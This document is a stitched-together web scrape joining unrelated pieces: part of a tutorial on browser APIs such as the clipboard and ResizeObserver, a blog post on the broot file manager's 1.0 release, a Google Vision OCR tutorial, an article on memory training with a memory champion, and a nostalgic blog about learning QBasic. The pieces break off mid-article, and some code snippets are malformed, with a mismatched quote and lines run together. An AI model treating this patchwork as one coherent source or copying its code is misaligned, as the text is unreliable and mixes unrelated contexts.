      <span>await</span> navigator.clipboard.writeText(copyText);
      <span>console</span>.log(<span>`<span>${copyText}</span> copied to clipboard`</span>);
   } <span>catch</span> (err) {
      <span>console</span>.error(<span>'Failed to copy: '</span>, err);
   }
}
</code></pre>
<p>The Async API function to read the content from the clipboard and do something with it,</p>
<pre><code><span>async</span> <span><span>function</span> <span>performPaste</span>(<span>event</span>) </span>{
   event.preventDefault();
   <span>try</span> {
       <span>const</span> text = <span>await</span> navigator.clipboard.readText();
       setPastetext(text);
       <span>console</span>.log(<span>'Pasted content: '</span>, text);
   } <span>catch</span> (err) {
      <span>console</span>.error(<span>'Failed to read clipboard contents: '</span>, err);
   }
}
</code></pre>
<p>Note: With the inclusion of the <code>Clipboard Async API</code>, you can get rid of the usage of <a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/Document/execCommand">document.execCommad()</a> function as it is obsolete now.</p>

<h2 id="3-resize-observer-api">3. 🧐 Resize Observer API</h2>
<p>Do you want to take some actions based on the changes to the content or border box of a DOM element? Are you thinking of writing a handler by yourself? What if I tell you, there is already one provided by the web API implementation?</p>
<p>Here is a story about a dumb button. We use a range slider to resize the button. While the button gets resized, we also want to control the text color, without letting the button know much about it. </p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598717277220/dITL6Nog2.gif?auto=format,compress&amp;gif-q=60" alt="resizer.gif"></p>
<p>First, create a button and specify an id so that, we can access the button later using the id.</p>
<pre><code>&lt;StyledButton id=<span>"dumbBtnId"</span>&gt;
   I am a Dumb Button
&lt;<span>/StyledButton&gt;</span>
</code></pre>
<p>Now we create a slider using the <code>range</code> input type from HTML5. A <code>resize()</code> function is invoked when the slider value changes.</p>
<pre><code>&lt;div&gt;
   <span><span>&lt;<span>input</span> 
         <span>onChange</span>=<span>{(event)</span> =&gt;</span> resize(event)} 
         type="range" 
         min={minRange} 
         max={maxRange} 
         defaultValue={rangeValue} /&gt;
<span>&lt;/<span>div</span>&gt;</span></span>
</code></pre>
<p>The <code>resize()</code> function simply sets the width of the button as the slider range value so that, it can be resized dynamically.</p>
<pre><code><span>const</span> resize = event =&gt; {
   <span>const</span> value = event.target.valueAsNumber;
   setRangeValue(value);
   <span>let</span> dumbBtn = <span>document</span>.getElementById(<span>'dumbBtnId'</span>);
   dumbBtn.style.width = <span>`<span>${value}</span>px`</span>;
 }
</code></pre>
<p>So far, so good? Now for every range value change, the button gets resized. We have a <code>ResizeObserver</code> observing this change and change the color of the button text.</p>
<pre><code>useEffect(() =&gt; {
   <span>try</span> {
            <span>let</span> dumbBtn = <span>document</span>.getElementById(<span>'dumbBtnId'</span>);
            <span>var</span> resizeObserver = <span>new</span> ResizeObserver(entries =&gt; {
                <span>for</span>(<span>const</span> entry <span>of</span> entries) {
                    
                    
                   entry.target.style.color = <span>'green`;
                }
      });
      resizeObserver.observe(dumbBtn);
   } catch(e) {
            setSupported(false);
            console.log(e);      
   }
}, [rangeValue]);</span>
</code></pre>

<h2 id="4-image-capture-api">4. 📷 Image Capture API</h2>
<p>There are some cool and useful APIs around user media like, audio, video etc. I love the <code>Image Capture API</code> which helps us to capture an image or grab a frame from the video devices(like webcam). Not only that, you can also perform actions on capturing an image or grabbing a frame.</p>
<p>First, get the user media access. In this case we are getting the webcam access.</p>
<pre><code>navigator.mediaDevices.getUserMedia({video: <span>true</span>})
  .then(mediaStream =&gt; {
     <span>document</span>.querySelector(<span>'video'</span>).srcObject = mediaStream;
     <span>const</span> track = mediaStream.getVideoTracks()[<span>0</span>];
     setTrack(track);
  }).catch(error =&gt; {
     <span>console</span>.error(<span>` <span>${error}</span> is not yet supported`</span>);
     setError(error);
});
</code></pre>
<p>Just like the clipboard paste operation, a webcam media access permission has to be granted by the user.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598717565379/MCRNY49Tl.png?auto=format&amp;q=60" alt="image.png"></p>
<p>Now Grab a frame and do something. In this example, I am just drawing the frame on a Canvas.</p>
<pre><code><span>const</span> imageCapture = <span>new</span> ImageCapture(track);
    imageCapture.grabFrame()
      .then(imageBitmap =&gt; {
          <span>const</span> canvas = <span>document</span>.querySelector(<span>'#grabFrameCanvas'</span>);
          drawCanvas(canvas, imageBitmap);
    }).catch(error =&gt; {
          <span>console</span>.log(error);
          setError(error);
});
</code></pre>
<p>I can also take a picture and do the similar thing.</p>
<pre><code><span>const</span> imageCapture = <span>new</span> ImageCapture(track);
    imageCapture.takePhoto().then(blob =&gt; createImageBitmap(blob))
      .then(imageBitmap =&gt; {
          <span>const</span> canvas = <span>document</span>.querySelector(<span>'#takePhotoCanvas'</span>);
          drawCanvas(canvas, imageBitmap);
    }).catch(error =&gt; {
          <span>console</span>.log(error);
          setError(error);
});
</code></pre>
<p>To stop the video streaming from the webcam, just call he method <code>stop()</code> on the running video track.</p>
<pre><code><span>const</span> videoOff = () =&gt; {
   track.stop();
 }
</code></pre>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598717833234/MPOxVZ92M.png?auto=format&amp;q=60" alt="chrome_Umvi16wUlu.png"></p>
<p>Also watch out for the methods,</p>
<ul>
<li><code>getPhotoCapabilities()</code>: To get the ranges of available configuration options.</li>
<li><code>getPhotoSettings()</code>: To get the current photo configuration settings.</li>
</ul>

<h2 id="5-broadcast-channel-api">5. 📡 Broadcast Channel API</h2>
<p>The <code>Broadcast Channel API</code> allows communication between browsing contexts (windows, tabs, iframes) and workers on the <strong>same origin</strong>. Think of a use-case like, once you logout from an app running in a browser tab, you want to broadcast it to the app instances opened in other tabs of the same browser.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
      <p>8 months ago, but it feels like years ago, somebody shared a link to broot <a href="https://news.ycombinator.com/item?id=21998638">on Hacker News</a>. There was some very kind messages and broot gained a few users. But I had more in my TODO list.</p>
<p>A lot was done since.</p>
<p>At first sight, <a href="https://dystroy.org/broot">broot</a> didn't change much:
It looks the same and what could be done then can still be done the same way, 500 commits and 60 releases later.</p>
<h2 id="you-can-still-explore-the-same-way">You can still explore the same way</h2>
<p>Broot still shows you an overview of directories, even huge ones, and lets you navigate and understand the structure.</p>
<p><img src="https://dystroy.org/blog/broot-1-0/old_broot-overview.png" alt="old_broot-overview"></p>
<h2 id="you-can-search-and-open-the-same-way">You can search and open the same way</h2>
<p>You search with a few keystrokes, navigate, hit <kbd>enter</kbd> on a directory to focus it, or <kbd>alt</kbd><kbd>enter</kbd> to <code>cd</code> to it.</p>
<p><img src="https://dystroy.org/blog/broot-1-0/old_broot-search.png" alt="old_broot-search"></p>
<p>You hit <kbd>enter</kbd> on a file to ask the system to open it, or a <kbd>space</kbd>, a <kbd>e</kbd> then <kbd>enter</kbd> to edit it in your favorite editor.</p>
<h2 id="you-can-manipulate-files-the-same-way">You can manipulate files the same way</h2>
<p>You do the standard manipulations like <code>rm</code>, <code>mv</code>, <code>cp</code>, <code>chmod</code>, etc. with just a space or a colon followed by the name of the verb and some arguments if necessary.</p>
<p><img src="https://dystroy.org/blog/broot-1-0/old_broot-cp.png" alt="old_broot-cp"></p>
<p>(here, after having selected my <code>deploy.sh</code> file with <code>sh</code>, I copy it into <code>preview.sh</code>)</p>

<h2 id="exploration-got-buffed">Exploration got buffed</h2>
<p>New data are available, for example the last modified dates and sizes which are deeply computed on directories (in background) and can be used for sorting.</p>
<p><img src="https://dystroy.org/blog/broot-1-0/new_broot-explore.png" alt="new_broot-explore"></p>
<p>And there's a preview now.</p>
<p><img src="https://dystroy.org/blog/broot-1-0/preview-text.png" alt="preview-text"></p>
<p><img src="https://dystroy.org/blog/broot-1-0/preview-image.png" alt="preview-image"></p>
<p><img src="https://dystroy.org/blog/broot-1-0/preview-binary.png" alt="preview-binary"></p>
<h2 id="searching-and-opening-got-buffed-too">Searching and opening got buffed too</h2>
<p>You can search on paths (not just filenames); or on file contents by prefixing your pattern with <code>c/</code>:</p>
<p><img src="https://dystroy.org/blog/broot-1-0/content-search.png" alt="content-search"></p>
<p>If you hit <kbd>ctrl</kbd><kbd>→</kbd>, which opens the preview, you see the matches in the file:</p>
<p><img src="https://dystroy.org/blog/broot-1-0/content-search-with-preview.png" alt="content-search-with-preview"></p>
<p>And from here you can navigate to the selected match, and maybe open the file on that line in your editor. A typical search process is described <a href="https://dystroy.org/blog/broot-c-search/">here</a>.</p>
<p>Just like for filtering on file names, content search results are updated while you type. And the search syntax lets you <a href="https://dystroy.org/broot/input/#the-filtering-pattern">combine searches</a>, for example you may find files containing both "foo" and "bar", but not the txt files, with <code>c/foo&amp;c/bar&amp;!/txt$/</code>.</p>
<p>Regarding file opening, the most requested feature was the ability to be back in broot when quitting vi or another terminal editor. This is now available.</p>
<h2 id="operations-on-files-got-buffed-too">Operations on files got buffed too</h2>
<p>The most visible change is the ability to open several panels, for example for operations involving two locations, like a move or copy:</p>
<p><img src="https://dystroy.org/blog/broot-1-0/cpp.png" alt="cpp"></p>
<p>Now I have to confess something: I expected probably too much from this feature. While it works and doesn't seem to have problems it turns out I don't use it much. It was probably less important for easier file operations than less visible features like tab completion. I don't know yet if I was blinded by my fond remembrance of Norton Commander (back in the days of Windows 3.1) or if there's something that should be improved. I'll probably have to think about this more and I'm curious of the opinion of experienced broot users.</p>
<p>Customization of verbs and their keyboard shortcuts was also improved, allowing richer actions, like opening sub terminals or launching non trivial external applications.</p>

<p>Most of the initial technical choices were probably right.</p>
<p>My enthusiam for Rust only grew during this time and I'm not sure I could have as easily done so many big refactorings with another language, especially as broot being a "side project" I didn't have it fully in head 100% of the time.
Having whole categories of bugs prevented by the language is a huge relief.</p>
<p>The biggest internal change was the replacement of <a href="https://github.com/redox-os/termion">Termion</a> with <a href="https://github.com/crossterm-rs/crossterm">Crossterm</a>.</p>
<p>Termion is obvious, concise, simple to use. It's still a good solution for a small linux utility. But it's limited and binding; its design makes features like skinning an application very difficult. And, at the time of the switch at least, it wasn't maintained and major bugs weren't handled.
Crossterm on the other hand, while intrinsically more complex, was more powerful.
Its main maintainers tackled the hard work of building a real cross-platform terminal IO library, which involves dealing with an incredible number of small discrepancies.
This choice allowed me to distribute broot on Mac and Windows and not just Linux.</p>
<p>I also introduced more concurrency, to make computations parallel and not block the interface.</p>
<p>Rust makes concurrency harder. You have to go to some length to do that properly, you can't just share a pointer and hope everything will be fine. It also makes it safer.
"Fearless concurrency" means you won't spend hours trying to guess all the ways your parallel computation could get unlucky. I found <a href="https://github.com/crossbeam-rs/crossbeam">Crossbeam</a> and <a href="https://github.com/rayon-rs/rayon">rayon</a> very useful basic bricks for building parallelims in broot.</p>

<p>In the last 8 months, I probably didn't spend one hour on a computer without using broot, I'm convinced it's a very useful tool which has no equivalent.</p>
<p>Using broot all the time made my TODO list grow to more than 600 lines (down to about 400 lines now). But there's nothing major anymore on it, nothing I feel essential, broot feels complete for me.</p>
<p>Right now what I'd like for broot is to find users, and with some luck some of those users will tell me how they use it which would fuel my reflection.</p>

                    <p><em>Christophe Pere is a senior NLP researcher and a Deepflow advisor. His post was originally published on <a href="https://towardsdatascience.com/what-is-google-api-vision-and-how-to-use-it-372a83e6d02c">Medium</a>. Cover picture by <a href="https://www.pexels.com/fr-fr/photo/personne-gens-femme-retro-3769697/">Andrea Piacquadio</a></em></p><h2 id="introduction">Introduction</h2><p>This post finds his root in an interesting project about knowledge extraction, which first step was to extract the text from PDF documents. As I work for a company that operating on the Google platform I naturally wanted to experiment with the OCR functionality included with the Google API Vision. Unfortunately, I couldn't find a straightforward way to use the API in order to extract text from images. I wrote this post as an introductory guide to Google API Vision and how to use it for your own projects.</p><blockquote>The notebook for this post is available on <a href="https://github.com/Christophe-pere/API_vision_google" rel="noopener nofollow">GitHub</a></blockquote><h2 id="google-api-vision">Google API Vision</h2><p>Google released the <a href="https://cloud.google.com/vision" rel="noopener nofollow">API</a> to help people, industry, and researchers to use their functionalities.</p><blockquote>Google Cloud's Vision API has powerful machine learning models pre-trained through REST and RPC APIs. Tag images and quickly organize them into millions of predefined categories. You will be able to detect objects and faces, read printed or handwritten text, and integrate useful metadata into your image catalog. (source: <a href="https://cloud.google.com/vision" rel="noopener nofollow">API Vision</a>)</blockquote><p>The part of the API that interested us for this post is the OCR part.</p><h2 id="ocr">OCR</h2><p><a href="https://cloud.google.com/vision/docs/ocr" rel="noopener nofollow">Optical Character Recognition</a> or OCR is a technology where characters are recognized and detected inside an image. Most of the time Convolutional Neural Networks (CNN) are trained on a very large dataset of characters and numbers in different types and colors. You can imagine a small window slicing on each pixel or group of pixels to detect characters or partial characters, spaces, forms, lines etc.</p><h2 id="service-account">Service Account</h2><blockquote>A service account is a special type of Google account intended to represent a non-human user that needs to authenticate and be authorized to access data in Google APIs. (<a href="https://cloud.google.com/iam/docs/understanding-service-accounts" rel="noopener nofollow">source: IAM google cloud</a>)</blockquote><p>Basically you can imagine it as an <a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)" rel="noopener nofollow">RSA </a>key (encrypted key to communicate with high security between machine via the internet) with which you can connect to Google services (API, GCS, IAM…). Its basic form is a <a href="https://www.json.org/json-en.html" rel="noopener nofollow">json </a>file.</p><h2 id="notebook">Notebook</h2><p>Here, I will show you the different functions to use the API and extract the text from the image automatically.</p><p>Libraries needed to be installed:</p><pre><code>!pip install google-cloud
!pip install google-cloud-storage
!pip install google-cloud-pubsub
!pip install google-cloud-vision
!pip install pdf2image
!pip install google-api-python-client
!pip install google-auth</code></pre><p>The libraries used:</p><pre><code>from pdf2image import convert_from_bytes

# to see a progress bar
tqdm().pandas()</code></pre><p>The OCR can take pdf, tiff and jpeg formats to be used in the API.In this post we will convert the pdf into jpeg to concatenate many pages in one picture. Two manners of using jpeg:</p><p>First, you could convert your <em>pdf </em>in <em>jpeg </em>files and save them into another repository:</p><pre><code># Name files where the pdf are and where you want to save the results
NAME_INPUT_FOLDER = "PDF FOLDER NAME"
NAME_OUTPUT_FOLDER= "RESULT TEXTS FOLDER"list_pdf = glob.glob(NAME_INPUT_FOLDER+"/*.pdf") # stock the name of the pdf files # Loop over all the files
for i in list_pdf:
        # convert the pdf into jpeg
        pages = convert_from_path(i, 500)
        
        for page in tqdm(enumerate(pages)):
            # save each page into jpeg 
            page[1].save(NAME_OUTPUT_FOLDER+"/"+i.split('/')[-1].split('.')[0]+'_'+str(page[0])+'.jpg', 'JPEG') # keep the name of the document and add increment </code></pre><p>Here, you can use your jpeg document with the API. But, you can do it better without saving the <em>jpeg </em>file and use it in memory to call the API directly.</p><h2 id="setup-credentials">Setup Credentials</h2><p>Before going deeper we need to configure the credentials of the Vision API. You’ll see, it’s very simple:</p><pre><code>SCOPES = ['https://www.googleapis.com/auth/cloud-vision']
SERVICE_ACCOUNT_FILE = "PUT the PATH of YOUR SERVICE ACCOUNT JSON FILE HERE"# Configure the google credentials
credentials = service_account.Credentials.from_service_account_file(
        SERVICE_ACCOUNT_FILE, scopes=SCOPES)</code></pre><h2 id="picture-manipulations">Picture manipulations</h2><p>This needed more code because we also concatenate 10 pages of documents to create a “big picture” and feed it to the API. One call versus 10 is better for the price because you’ll pay each time you’ll request the API.</p><p>Let’s go:</p><!--kg-card-begin: html--><!--kg-card-end: html--><p>With these two functions, you’ll be able to load a pdf file, convert it into bytes, create a “big picture” and feed it to the function <strong><em>detect_text_document() </em></strong>(details below).</p><p>The function <strong><em>detect_text_document </em></strong>takes in input the content of the pictures and the credentials (information of your service account).</p><!--kg-card-begin: html--><!--kg-card-end: html--><p>The output is a text extracted from the images. The goal of this function is to concatenate words into paragraphs and documents.</p><h2 id="how-to-use-it">How to use it?</h2><p>You can use this block of functions like this:</p><pre><code>for doc_pdf in tqdm(list_pdf):        # call the function which convert into jpeg, stack 10 images
        # and call the API, save the output into txt file 
        concat_file_ocr(doc_pdf)</code></pre><p>The input is just the path obtained with the <em>glob </em>function. The credentials were generated in the <strong><em>Setup Credentials</em></strong> part. This loop will take each pdf of the input files, call the API with a jpeg file obtained by converting the pdf and save text files containing the detection.</p><h2 id="conclusion">Conclusion</h2><p>Here, you reach the end of the tutorial on how to use the Vision API and generate text files containing the detection automatically. You know how to configure credentials with your service account and convert a pdf into a jpeg file (one jpeg per page). Is it all? No, I have some bonuses for you (see below).</p><h2 id="bonus-1-use-the-api-per-page">Bonus 1: Use the API per page</h2><p>The previous functions allow you to use the API with the concatenation of pages. But, we can use the API per page of the pdf document. The function below will request the API for each page of the convert pdf into a <em>jpeg </em>format.</p><!--kg-card-begin: html--><!--kg-card-end: html--><p>It’s very easy to use it, just call this function with the path of the pdf folder and the credentials. Like this:</p><pre><code>if per_page: # option True if you want to use per page
    # call the API vision per page of the pdf
    for i in tqdm(list_pdf):
        # open the pdf and convert it into a PlImage format jpeg
        call_ocr_save_txt(i, cred=credentials)</code></pre><h2 id="bonus-2-use-multiprocessing-library">Bonus 2: Use multiprocessing library</h2><p>Just for fun, you can use this API with multiprocessing (ok it’s not real multiprocessing in python with the Global Interpreter Lock (GIL)). But, here the code:</p><pre><code>if multi_proc:
    nb_threads = mp.cpu_count() # return the number of CPU
    print(f"The number of available CPU is {nb_threads}")
        # if you want to use the API without stacking the pages
    if per_page:
        # create threads corresponding to the number specified
        pool = mp.Pool(processes=nb_threads)    
        # map the function with part of the list for each thread
        result = pool.map(call_ocr_save_txt, list_pdf) 
        
    if per_document:
        pool = mp.Pool(processes=nb_threads) 
        result = pool.map(concat_file_ocr, list_pdf)</code></pre>

It's an embarrassing question for both parties, but especially frustrating for the forgetful one. With all the information we take in on a daily basis, these little lapses are irritating but inevitable, right? Maybe not.&nbsp;</p>  <p>While it's unlikely that you can remember every day crystal clearly (like those who have HSAM, <a href="https://www.cbc.ca/natureofthings/features/total-recall-some-people-can-remember-every-day-like-it-was-yesterday" target="_blank"><u>Highly Superior Autobiographical Memory</u></a>), there are strategies for improving memory retention outside of <a href="https://gem.cbc.ca/media/the-passionate-eye/season-1/episode-102/38e815a-00dc9c2fa63" target="_blank"><u>fighting memory loss</u></a> associated with aging. We asked <a href="http://www.artdelamemoire.org/in-english" target="_blank"><u>Francis Blondin</u></a>, two-time Canadian Memory Champion and board member of the <a href="http://canadianmindsports.com/" target="_blank"><u>Canadian Mind Sports Association</u></a>, for his insight on the different kinds of memory and where we might be able to focus our brain building efforts.</p>  <p><strong>Natural vs. trained memory</strong></p>  <p>Blondin highlights the distinction between "memory as a natural ability that we all possess to varying degrees, versus memorization, as a skill that you can learn to get better at." He says, "It's not the same thing, and you can become extremely good at memorizing stuff, even if you happen to be born with below average memory." Though you <em>can</em> improve your natural memory through lifestyle, Blondin says natural memory abilities are largely dependent on your genes. Your trained memory, however, "can be spectacularly improved almost without limits."&nbsp;</p>  <p>"I can spend hours reciting all the thousands of things I have stored in various memory palaces," he says. More on memory palaces later. "When I'm at my peak, I can memorize 100 digits in less than a minute. And yet, I swear that my natural memory is still, to this day, nothing special at all. Just yesterday I ruined my coffee maker by forgetting it on the stove long enough for the plastic handle to melt." So, even if you don't think your natural memory is all that great, there's still a lot you can do.</p>  <p><strong>Types of memory</strong></p>  <p>Blonding took us through the different kinds of memory and their functions.</p>  <p><strong>Implicit and explicit memory</strong></p>  <p><strong>"</strong>Explicit memory is what you can say out loud: 'Newton was an important scientist'" says Blondin. "Implicit is everything else." He offers these examples: "The feeling that you probably should avoid falling off a cliff or putting your hands on a hot stove is a form of implicit memory. So is every ability you've learned to perform, like riding a bike or tying your shoelaces."</p>  <p><strong>Procedural memory</strong></p>  <p>Procedural memory describes a specific kind of implicit memory that includes all the abilities you've developed. Blondin says these include "how to read and write, how to hold a fork and again, how to ride a bike." To better develop these abilities, Blondin points to K. Anders Ericsson's concept of <a href="https://graphics8.nytimes.com/images/blogs/freakonomics/pdf/DeliberatePractice(PsychologicalReview).pdf" target="_blank"><u>deliberate practice</u></a> — focused, systematic practice to optimize performance.</p>  <p><strong>Sensory memory</strong></p>  <p>"That's all the thousands of bits of data that we're perceiving all the time through our senses," says Blondin. "Of this almost-infinite amount of data, 99+ per cent will be forgotten in half a second, but your brain will select a few things that, for various reasons, seem to be worthy of attention." This isn't typically the kind of memory you try to improve, but Blondin offers the example of "people who are passionate about cooking, over time, will develop a more powerful sensory memory for different tastes."</p>  <p><strong>Short-term and working memory</strong></p>  <p>Short-term and working memory are terms often used interchangeably, though the two have complex distinctions that are still being <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3425965/" target="_blank"><u>analyzed</u></a>. In simple terms, working memory can be seen as a pattern or a process, while short-term memory is more focused on duration. "Working memory is what you use in real time to consciously remember something, analyze something or perform an action," Blondin says. Working memory also involves your ability to group data into chunks. Blondin uses the example of learning how to speak French. "At the beginning, saying the word <em>bibliothèque</em> might necessitate most of your working memory capacity." You might need to break the word into multiple chunks: <em>bi - blio - thèque</em>. With time and practice, you'll be able to say a full sentence containing the word <em>bibliothèque</em>, while also thinking about what comes next. "Improving your working memory is like improving your IQ," he says, "it's pretty damn hard. I think it's possible, but it's not something most people should focus on."</p>  <p><strong>Episodic memory</strong></p>  <p>Episodic memory is everything involved in "remembering your life and what happened to you," Blondin says. "Although episodic memory is stored in your brain differently than factual knowledge, there isn't much difference between the tips and tricks I would give to someone hoping to better remember their life."</p>  <p><strong>Semantic memory</strong></p>  <p>Semantic memory covers areas like factual knowledge, words, numbers, concepts and so on. Blondin says, "This is most people's main area of focus when they say they worry about their memory. All the tips I've provided will help tremendously."</p>  <p><strong>Tips for improving your memory</strong></p>  <p><strong>Learn to focus on just one thing at a time (at least for a moment)</strong></p>  <p>"Your ability to concentrate is crucial for memorizing and for most important cognitively-demanding forms of work," Blondin says. "Your ability to focus can be trained and it can be improved. If you're a student and you want to learn and remember a lot, you need to get your cell phone and internet addiction under control. Those quick, 30-second checks of your email are much more damaging to your concentration than you can imagine." Blondin suggests giving yourself at least 15 minutes of uninterrupted focus before taking a short break. "Ideally those short breaks should be for walking around, breathing, chatting with someone or eating," he says, "not for your emails or anything that will keep capturing your attention when you try to go back to work."</p>  <p><strong>Don't just listen or read — test yourself</strong></p>  <p>"To remember something long-term, the two most important concepts you need to know are retrieval practice and spaced repetition," says Blondin. "Retrieval practice is basically just testing yourself. Don't just reread your notes, close your book and see how much you can recall without any aid. That's not just a way to verify what has been remembered, it's also an extremely powerful way to learn. You can read and reread a million books and spend a million years sitting in class, but very little of what you've read and heard will stick if you don't make an effort to actively process and recall the information." Even if your goals aren't academic, Blodin says, "You should still use retrieval practice by asking yourself questions like 'What's my credit card number?' or 'What's the name of that guy again?'".</p>  <p><strong>Spaced repetitions for long-term learning</strong></p>  <p>Spaced repetition is a systematic review system. Blondin says, "On the first day, you review [something] as much as you need to in order to make sure you won't forget it after a few hours. One or two reviews will be enough for that purpose most of the time. Then you review once the following day. Then you start spacing out the reviews." He suggests a three day interim, then seven days, then one month, two months, three months and so on. "Eventually, just two reviews a year can be enough," Blondin believes. "You can become really good at memorizing and at building memory palaces, but you'll still forget most of what you learn if you never review. That's not a problem if you just want to do something once, like a presentation or an exam, but for long-term learning, there's no getting around the fact that you need to review." Blondin also recommends using spaced repetition software (like <a href="https://apps.ankiweb.net/" target="_blank"><u>Anki</u></a> or <a href="https://quizlet.com/" target="_blank"><u>Quizlet</u></a>) to help you along. Spaced repetition and retrieval practice can be combined to help you "remember amazing amounts of information," says Blondin.</p>  <p><strong>Mnemonics and memory palaces</strong></p>  <p>"There are many things you can learn using just focused attention, direct associations, logic, understanding and your natural memory," Blondin says. "However, there are also a lot of facts, difficult words, names, numbers and concepts that won't easily stick." For those, Blondin suggests using mnemonics, where your brain transforms something difficult to remember into something "your strange brain can remember much more easily."&nbsp;</p>  <p>With names he says, "It's easy enough if I just heard it and it's floating around in my short-term memory, but I'll forget it in a few seconds if I don't make an effort. How can I make this name more memorable?" He suggests adding associations and imagery. The name "Bob", for example, might conjure an image of bobbing for apples. Blondin says, "That quickly improvised image will transform what's initially a bunch of mostly meaningless sounds into something funny and easy to remember." He points to a <a href="https://www.nytimes.com/2016/03/24/upshot/an-ancient-and-proven-way-to-improve-memory-go-ahead-and-try-it.html" target="_blank"><u>New York Times article</u></a> that breaks down the process in depth.</p>  <p>Similar in practice, the <a href="https://litemind.com/memory-palace/" target="_blank"><u>memory palace</u></a> technique consists of vividly visualizing an environment you know very well, like your bedroom, and associating information you need to memorize with it (eg. your credit card number is in the sock drawer). Then, when you walk through that environment again in your mind, that information will be in place for you to retrieve.</p>  <p>These tips don't have to be flawless to have the desired effect. "To paraphrase someone else," says Blondin, "memory techniques work even when they don't work. Just the fact that you're paying attention to something and you're playing around with it is enough to drastically improve your odds of remembering."</p>  <p><strong>Lifestyle practices</strong></p>  <p>"Both meditation and physical exercise will help improve your memory and your ability to focus," says Blondin, "but that's just one of at least 50 different reasons why you should start developing those two habits." Blondin suggests that even one minute per day of meditation can have an impact.</p>  <p>"Diet is, of course, very important for all kinds of reasons," notes Blondin, "but as long as you have a relatively healthy diet, I …</p></span></p></div></div>

<p>Somewhere in the depths of my hard drive is a folder named “Archive”. It’s a home for all sorts of files that I no longer need, but can’t quite bring myself to delete. Old homework assignments from high school, revisions 1 through FINISHED-FINAL.doc. MSN chat logs, preserving conversations with people I’ve not spoken to in 10 years. Random low-resolution photos of not very much, shot with the first digital camera my family ever owned. Layers of backup directories piled above the deposits of those before them, poised to restore devices long since sold on eBay. A veritable time capsule of my digital life.</p>
<p>Not something I pry open the lid on very often, but lockdown-induced nostalgia enticed me to visit again a few weeks ago. I was in search of the roots of my journey in programming. I found them inside a dormant virtual machine, the ghostly continuation of an old family computer that I had immortalised in .vmdk form.</p>
<p>Firing up VirtualBox, I went digging.</p>
<p><a href="https://peterdn.com/images/hello-qbasic-nostalgia/MallardBASICBookCover.jpg">
  <img src="https://peterdn.com/images/hello-qbasic-nostalgia/MallardBASICBookCover.jpg" width="220px" alt="Book cover: Mallard BASIC Introduction and Reference" title="Book cover: Mallard BASIC Introduction and Reference">
</a>
</p>
<h2 id="ccd-qbasicbc7">C:&gt;cd QBASIC\BC7</h2>
<p>It all started about 16 years ago. I was already a proficient user of technology in general, as most computer game-obsessed teenagers are wont to be. My initial motivation for skilling up was quite simple, albeit ambitious: I wanted to be able to “hack” a certain online game. Luckily, I wasn’t expecting quick results and soon lost sight of this nefarious goal to discover the joy of programming as something in itself.</p>
<p>My Grandad had on several occasions previously attempted to enthuse me in the subject, to no avail. Now, excited that I was finally displaying interest of my own accord, he provided me with a floppy disk containing QBasic 1.1 and a manual for Mallard BASIC. I started at page 1 and worked my way through the book — as far as the difference in dialect between QBasic and Mallard BASIC would allow, anyway.</p>
<h3 id="first-step-into-a-larger-world">First step into a larger world</h3>
<p>Safe to say, it took me a while to get enough of a hang of things before I could really begin to translate ideas from my imagination onto screen. The first game I created was Asterix[sic] 9. It was probably also my first “substantial” program, built with other users in mind, not just for myself.</p>
<p><a href="https://peterdn.com/images/hello-qbasic-nostalgia/asterix9.bas.gif">
  <img src="https://peterdn.com/images/hello-qbasic-nostalgia/asterix9.bas.gif" width="640px" alt="Screen capture showing playthrough of Asterix 9, a simple maze puzzle game" title="">
</a>
</p>
<p>Asterix 9 went through many rewrites as I discovered more and more programming concepts. The debut version is written almost as if parodying the worst kind of BASIC program: I had not yet realised that QBasic did not require every line to be numbered (as the Mallard BASIC book would have me believe!), and concepts like arrays, looping, functions, and DRY were still very much unknown to me. The liberal use of GOTOs makes it very spaghetti-esque, not helped by non-existence of human readable labels. Every level of the game is just a copy-and-paste of the previous level with line numbers incremented (this used to take me hours of “refactoring”). It’s truly awful. I’d be lying, however, if I said I didn’t have an absolute blast figuring out how to code it, at the time.</p>
<p>Here is an excerpt of part of the game loop that checks teleportation and collision into one of the “9"s:</p>
<pre><code>4161 IF currx% = 4 AND curry% = 8 AND count1 &lt; 1 THEN GOTO 4550
4162 IF currx% = 14 AND curry% = 18 AND count2 &lt; 1 THEN GOTO 4680
4163 IF currx% = 20 AND curry% = 14 AND count3 &lt; 1 THEN GOTO 5100
4164 IF currx% = 12 AND curry% = 12 AND count4 &lt; 1 THEN GOTO 5230
4165 COLOR 5
4166 IF count1 &lt; 1 THEN LOCATE 4, 8: PRINT CHR$(176)

<h3 id="evolution-via-emulation">Evolution via emulation</h3>
<p>I’ve always had an urge to learn how things work from the ground up, and this endeavour was no different. A lot of my effort was spent exploring how programs that I was familiar with might have been implemented.</p>
<p>As I got the hang of ASCII text manipulation and interacting with devices other than the screen, I created a simple word processor. I had not yet discovered mouse controls, so it was entirely keyboard-driven, including the menu options. It was able to save and load a custom rich text format that included support for different colours (the 16 supported in <code>SCREEN 0</code> mode).</p>
<p>Implementing word wrap in this setting was among my proudest achievements up to this point!</p>

</a>
</p>
<p>I also wrote an “encoder” version that “encrypted” its document, and could load and decrypt documents stored on disk. The only problem was that it used an approximately 6-bit key, which in any event was stored inside the encrypted file — thankfully I know a bit more about security today!</p>

</a>
</p>
<p>These programs were at least several steps up in quality from that first version of Asterix 9. I’d learned that labels weren’t mandatory for every line, and they could be human-readable. I’d also learned a few more control flow patterns and how to use <code>DATA</code> to encode blocks of data outside of the code. Young me still very much could have benefitted from reading Clean Code, however!</p>
<pre><code>TYPE encryption
        enco AS INTEGER
        encryptnu AS INTEGER
        length AS INTEGER
END TYPE
DIM code AS encryption
...
RANDOMIZE TIMER
encrypt = INT(RND * 45) + 3
...
OPEN filename$ FOR RANDOM AS #1 LEN = LEN(code)
code.encryptnu = encrypt
code.length = l
PUT 1, 1, code
</code></pre>
<p>My fascination with wanting to build things from scratch eventually reached its logical conclusion: I wanted to create my own operating system<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>.</p>
